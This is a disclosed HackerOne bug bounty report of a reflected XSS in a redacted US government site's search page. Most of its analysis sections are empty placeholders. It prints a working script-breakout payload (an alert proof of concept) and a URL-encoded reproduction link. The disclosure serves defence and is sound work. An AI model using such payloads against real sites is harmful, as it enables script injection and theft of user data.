# Reflected XSS on ███████

## Metadata
- **Source:** HackerOne
- **Report:** 1062380 | https://hackerone.com/reports/1062380
- **Submitted:** 2020-12-19
- **Reporter:** ph0cu5
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary 
Reflected XSS on `████████`.

## Description
During my explorations I found `█████████/search/node`, which provides a basic search functionality. If we search something, the value is reflected and not properly sanitized. For example if we search `██████████/search/node/chron0x` we can see in the javascript code:
```javascript
[...]
<script>
	//Early marking that the browser supports ja

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary 
Reflected XSS on `████████`.

## Description
During my explorations I found `█████████/search/node`, which provides a basic search functionality. If we search something, the value is reflected and not properly sanitized. For example if we search `██████████/search/node/chron0x` we can see in the javascript code:
```javascript
[...]
<script>
	//Early marking that the browser supports javascript
	try {
		document.getElementsByTagName('body')[0].classList.add("js");
	} catch(E) {
		document.getElementsByTagName('body')[0].className += " js";
	}
	var rootN = "https://████/████";
	var whoisURL = "/█████████";
	var eventTitle = "";
	var ████; //Whether the person is on the receiving end of chats
	var internalPath = 'search/node/chron0x';
</script>
[...]
```
Due to improper input sanitization, this is vulnerable to XSS. Inserting the payload `';alert('chron0x');'` into the search field leads to
```javascript
[...]
<script>
	//Early marking that the browser supports javascript
	try {
		document.getElementsByTagName('body')[0].classList.add("js");
	} catch(E) {
		document.getElementsByTagName('body')[0].className += " js";
	}
	var rootN = "https://████/██████████";
	var whoisURL = "/████";
	var eventTitle = "";
	var ████; //Whether the person is on the receiving end of chats
	var internalPath = 'search/node/';alert('chron0x');'';
</script>
[...]
```
This pops an alert box, demonstrating XSS.

Note: I am reporting this here, since the footer of `█████████` states `Official United States ████ Website. The █████ ████████.`, and the United States ██████████ underlies the DoD. If this should not belong to the DoD scope I would kindly ask to self close this issue.

## Step-by-step Reproduction Instructions

1. Visit `https://██████████/search/node/%27%3Balert%28%27chron0x%27%29%3B%27`

An alert box with `chron0x` pops.

I am attaching an image demonstrating the XSS.

## Mitigation/Remediation Actions
Sanitize the input for the article parameter, such that certain characters are encoded or not allowed.

## Impact

Medium - Data can be stolen, or Javascript can be executed.

</details>

---
*Analysed by Claude on 2026-05-24*
